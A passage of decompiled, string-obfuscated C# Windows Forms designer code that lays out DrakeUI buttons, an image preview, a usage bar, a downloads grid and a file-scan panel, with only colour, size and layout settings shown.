		this.toggleview.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.toggleview.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.toggleview.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.toggleview.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.toggleview.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.toggleview.Size = new System.Drawing.Size(199, 32);
		this.toggleview.Style = DrakeUI.Framework.UIStyle.Custom;
		this.toggleview.Symbol = 61502;
		this.toggleview.TabIndex = 51;
		this.toggleview.Text = EXGuarder._5A062B08;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(8, 7);
		this.DrakeWidth_W4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W4.Name = EXGuarder._73596C75;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(199, 14);
		this.DrakeWidth_W4.TabIndex = 52;
		this.viwimagepanel.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.viwimagepanel.Controls.Add(this.viwimage);
		this.viwimagepanel.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.viwimagepanel.Location = new System.Drawing.Point(8, 341);
		this.viwimagepanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.viwimagepanel.Name = EXGuarder._2F750D67;
		this.viwimagepanel.Size = new System.Drawing.Size(215, 327);
		this.viwimagepanel.TabIndex = 40;
		this.viwimage.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.viwimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viwimage.Location = new System.Drawing.Point(0, 0);
		this.viwimage.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.viwimage.Name = EXGuarder._05792E52;
		this.viwimage.Size = new System.Drawing.Size(213, 325);
		this.viwimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.viwimage.TabIndex = 38;
		this.viwimage.TabStop = false;
		this.TableLayoutPanel2.ColumnCount = 3;
		this.TableLayoutPanel2.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel2.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel2.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel2.Controls.Add(this.shortbtn6, 2, 1);
		this.TableLayoutPanel2.Controls.Add(this.shortbtn1, 0, 0);
		this.TableLayoutPanel2.Controls.Add(this.shortbtn2, 1, 0);
		this.TableLayoutPanel2.Controls.Add(this.shortbtn3, 2, 0);
		this.TableLayoutPanel2.Controls.Add(this.shortbtn5, 1, 1);
		this.TableLayoutPanel2.Controls.Add(this.shortbtn4, 0, 1);
		this.TableLayoutPanel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.TableLayoutPanel2.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.AddColumns;
		this.TableLayoutPanel2.Location = new System.Drawing.Point(8, 101);
		this.TableLayoutPanel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.TableLayoutPanel2.Name = EXGuarder._25225366;
		this.TableLayoutPanel2.RowCount = 2;
		this.TableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 50f));
		this.TableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 50f));
		this.TableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20f));
		this.TableLayoutPanel2.Size = new System.Drawing.Size(215, 138);
		this.TableLayoutPanel2.TabIndex = 42;
		this.shortbtn6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn6.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn6.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn6.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn6.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn6.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn6.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn6.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn6.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn6.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn6.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn6.Location = new System.Drawing.Point(145, 71);
		this.shortbtn6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn6.Name = EXGuarder._38465158;
		this.shortbtn6.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn6.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn6.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn6.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn6.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn6.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn6.Size = new System.Drawing.Size(67, 65);
		this.shortbtn6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn6.Symbol = 61733;
		this.shortbtn6.SymbolSize = 25;
		this.shortbtn6.TabIndex = 72;
		this.BTtiptool.SetToolTip(this.shortbtn6, EXGuarder._57201F0A);
		this.shortbtn1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn1.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn1.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn1.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn1.Location = new System.Drawing.Point(3, 2);
		this.shortbtn1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn1.Name = EXGuarder._294E5363;
		this.shortbtn1.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn1.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn1.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn1.Size = new System.Drawing.Size(65, 65);
		this.shortbtn1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn1.Symbol = 57573;
		this.shortbtn1.SymbolSize = 25;
		this.shortbtn1.TabIndex = 69;
		this.BTtiptool.SetToolTip(this.shortbtn1, EXGuarder._6E6C2377);
		this.shortbtn2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn2.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn2.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn2.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn2.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn2.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn2.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn2.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn2.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn2.Location = new System.Drawing.Point(74, 2);
		this.shortbtn2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn2.Name = EXGuarder._662C6A4B;
		this.shortbtn2.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn2.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn2.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn2.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn2.Size = new System.Drawing.Size(65, 65);
		this.shortbtn2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn2.Symbol = 61502;
		this.shortbtn2.SymbolSize = 25;
		this.shortbtn2.TabIndex = 70;
		this.BTtiptool.SetToolTip(this.shortbtn2, EXGuarder._5D5F4E61);
		this.shortbtn3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn3.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn3.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn3.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn3.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn3.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn3.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn3.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn3.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn3.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn3.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn3.Location = new System.Drawing.Point(145, 2);
		this.shortbtn3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn3.Name = EXGuarder._020A3A32;
		this.shortbtn3.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn3.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn3.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn3.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn3.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn3.Size = new System.Drawing.Size(67, 65);
		this.shortbtn3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn3.Symbol = 61488;
		this.shortbtn3.SymbolSize = 25;
		this.shortbtn3.TabIndex = 71;
		this.BTtiptool.SetToolTip(this.shortbtn3, EXGuarder._3D050D31);
		this.shortbtn5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn5.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn5.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn5.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn5.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn5.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn5.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn5.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn5.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn5.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn5.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn5.Location = new System.Drawing.Point(74, 71);
		this.shortbtn5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn5.Name = EXGuarder._53755B1F;
		this.shortbtn5.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn5.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn5.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn5.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn5.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn5.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn5.Size = new System.Drawing.Size(65, 65);
		this.shortbtn5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn5.Symbol = 61501;
		this.shortbtn5.SymbolSize = 25;
		this.shortbtn5.TabIndex = 73;
		this.BTtiptool.SetToolTip(this.shortbtn5, EXGuarder._15665000);
		this.shortbtn4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.shortbtn4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.shortbtn4.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn4.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.shortbtn4.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn4.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn4.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.shortbtn4.Font = new System.Drawing.Font(EXGuarder._0C280858, 10f, System.Drawing.FontStyle.Bold);
		this.shortbtn4.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn4.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn4.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn4.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.shortbtn4.Location = new System.Drawing.Point(3, 71);
		this.shortbtn4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.shortbtn4.Name = EXGuarder._17460F02;
		this.shortbtn4.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.shortbtn4.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.shortbtn4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.shortbtn4.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn4.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.shortbtn4.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.shortbtn4.Size = new System.Drawing.Size(65, 65);
		this.shortbtn4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.shortbtn4.Symbol = 61563;
		this.shortbtn4.SymbolSize = 25;
		this.shortbtn4.TabIndex = 74;
		this.BTtiptool.SetToolTip(this.shortbtn4, EXGuarder._3C087278);
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(8, 91);
		this.DrakeWidth_W2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W2.Name = EXGuarder._341D203A;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(215, 10);
		this.DrakeWidth_W2.TabIndex = 0;
		this.Panel11.Controls.Add(this.Panel2);
		this.Panel11.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel11.Location = new System.Drawing.Point(8, 7);
		this.Panel11.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel11.Name = EXGuarder._016A0114;
		this.Panel11.Padding = new System.Windows.Forms.Padding(4);
		this.Panel11.Size = new System.Drawing.Size(215, 84);
		this.Panel11.TabIndex = 41;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.usagetitle);
		this.Panel2.Controls.Add(this.usageprecent);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.Location = new System.Drawing.Point(4, 4);
		this.Panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel2.Name = EXGuarder._11023275;
		this.Panel2.Padding = new System.Windows.Forms.Padding(5);
		this.Panel2.Size = new System.Drawing.Size(207, 76);
		this.Panel2.TabIndex = 34;
		this.usagetitle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.usagetitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.usagetitle.Font = new System.Drawing.Font(EXGuarder._0C280858, 8f);
		this.usagetitle.ForeColor = System.Drawing.SystemColors.ControlDark;
		this.usagetitle.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
		this.usagetitle.Location = new System.Drawing.Point(5, 5);
		this.usagetitle.Name = EXGuarder._2A0E3B59;
		this.usagetitle.Size = new System.Drawing.Size(197, 43);
		this.usagetitle.TabIndex = 36;
		this.usagetitle.Text = EXGuarder._61165112;
		this.usagetitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.usageprecent.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.usageprecent.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.usageprecent.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.usageprecent.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.usageprecent.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.usageprecent.Location = new System.Drawing.Point(5, 48);
		this.usageprecent.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.usageprecent.MinimumSize = new System.Drawing.Size(69, 23);
		this.usageprecent.Name = EXGuarder._73422905;
		this.usageprecent.Radius = 15;
		this.usageprecent.RectColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.usageprecent.Size = new System.Drawing.Size(197, 23);
		this.usageprecent.Style = DrakeUI.Framework.UIStyle.Custom;
		this.usageprecent.TabIndex = 34;
		this.usageprecent.Text = EXGuarder._215A2161;
		this.emptytext.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptytext.Dock = System.Windows.Forms.DockStyle.Top;
		this.emptytext.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.emptytext.ForeColor = System.Drawing.SystemColors.Control;
		this.emptytext.Location = new System.Drawing.Point(0, 0);
		this.emptytext.Name = EXGuarder._6D0B0411;
		this.emptytext.Size = new System.Drawing.Size(1231, 78);
		this.emptytext.TabIndex = 39;
		this.emptytext.Text = EXGuarder._260A4661;
		this.emptytext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.emptytext.Visible = false;
		this.TabPage2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage2.Controls.Add(this.DGVDATA);
		this.TabPage2.ImageIndex = 1;
		this.TabPage2.Location = new System.Drawing.Point(0, 0);
		this.TabPage2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.TabPage2.Name = EXGuarder._34320D60;
		this.TabPage2.Size = new System.Drawing.Size(1231, 753);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = EXGuarder._3C087278;
		this.DGVDATA.AllowUserToAddRows = false;
		this.DGVDATA.AllowUserToDeleteRows = false;
		this.DGVDATA.AllowUserToResizeColumns = false;
		this.DGVDATA.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVDATA.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVDATA.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVDATA.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVDATA.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVDATA.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVDATA.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVDATA.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
		this.DGVDATA.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVDATA.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVDATA.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVDATA.ColumnHeadersVisible = false;
		this.DGVDATA.Columns.AddRange(this.N, this.P, this.S, this.ST, this.progclu);
		this.DGVDATA.ContextMenuStrip = this.ctxdowns;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVDATA.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVDATA.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVDATA.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVDATA.EnableHeadersVisualStyles = false;
		this.DGVDATA.GridColor = System.Drawing.Color.White;
		this.DGVDATA.Location = new System.Drawing.Point(0, 0);
		this.DGVDATA.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DGVDATA.Name = EXGuarder._42097472;
		this.DGVDATA.ReadOnly = true;
		this.DGVDATA.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._0C280858, 11f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVDATA.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVDATA.RowHeadersVisible = false;
		this.DGVDATA.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle5.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(224, 224, 224);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVDATA.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVDATA.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVDATA.Size = new System.Drawing.Size(1231, 753);
		this.DGVDATA.TabIndex = 8;
		this.N.HeaderText = EXGuarder._220A3823;
		this.N.MinimumWidth = 6;
		this.N.Name = EXGuarder._106E1621;
		this.N.ReadOnly = true;
		this.P.HeaderText = EXGuarder._151C1314;
		this.P.MinimumWidth = 6;
		this.P.Name = EXGuarder._22361D43;
		this.P.ReadOnly = true;
		this.S.HeaderText = EXGuarder._60333F24;
		this.S.MinimumWidth = 6;
		this.S.Name = EXGuarder._49176661;
		this.S.ReadOnly = true;
		this.ST.HeaderText = EXGuarder._6C057334;
		this.ST.MinimumWidth = 6;
		this.ST.Name = EXGuarder._416F4427;
		this.ST.ReadOnly = true;
		this.progclu.HeaderText = EXGuarder._3779261F;
		this.progclu.MinimumWidth = 6;
		this.progclu.Name = EXGuarder._261E3718;
		this.progclu.ReadOnly = true;
		this.ctxdowns.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxdowns.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.StopDownloadToolStripMenuItem, this.ClearAllToolStripMenuItem });
		this.ctxdowns.Name = EXGuarder._24776C3D;
		this.ctxdowns.Size = new System.Drawing.Size(183, 52);
		this.StopDownloadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.StopDownloadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.StopDownloadToolStripMenuItem.Name = EXGuarder._494D534E;
		this.StopDownloadToolStripMenuItem.Size = new System.Drawing.Size(182, 24);
		this.StopDownloadToolStripMenuItem.Text = EXGuarder._0E562863;
		this.ClearAllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.ClearAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ClearAllToolStripMenuItem.Name = EXGuarder._43130903;
		this.ClearAllToolStripMenuItem.Size = new System.Drawing.Size(182, 24);
		this.ClearAllToolStripMenuItem.Text = EXGuarder._4F5F5420;
		this.TabPage3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage3.Controls.Add(this.filesscanpanel);
		this.TabPage3.ImageIndex = 2;
		this.TabPage3.Location = new System.Drawing.Point(0, 0);
		this.TabPage3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.TabPage3.Name = EXGuarder._2237062F;
		this.TabPage3.Size = new System.Drawing.Size(1231, 753);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = EXGuarder._5548454E;
		this.filesscanpanel.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.filesscanpanel.Controls.Add(this.DGVFIND);
		this.filesscanpanel.Controls.Add(this.Panel5);
		this.filesscanpanel.Controls.Add(this.Panel7);
		this.filesscanpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.filesscanpanel.ForeColor = System.Drawing.Color.FromArgb(128, 255, 255);
		this.filesscanpanel.Location = new System.Drawing.Point(0, 0);
		this.filesscanpanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.filesscanpanel.Name = EXGuarder._23522164;
		this.filesscanpanel.Size = new System.Drawing.Size(1231, 753);
		this.filesscanpanel.TabIndex = 16;
		this.filesscanpanel.Tag = EXGuarder._4B303A59;
		this.DGVFIND.AllowUserToAddRows = false;
		this.DGVFIND.AllowUserToDeleteRows = false;
		this.DGVFIND.AllowUserToResizeColumns = false;
		this.DGVFIND.AllowUserToResizeRows = false;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		dataGridViewCellStyle6.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
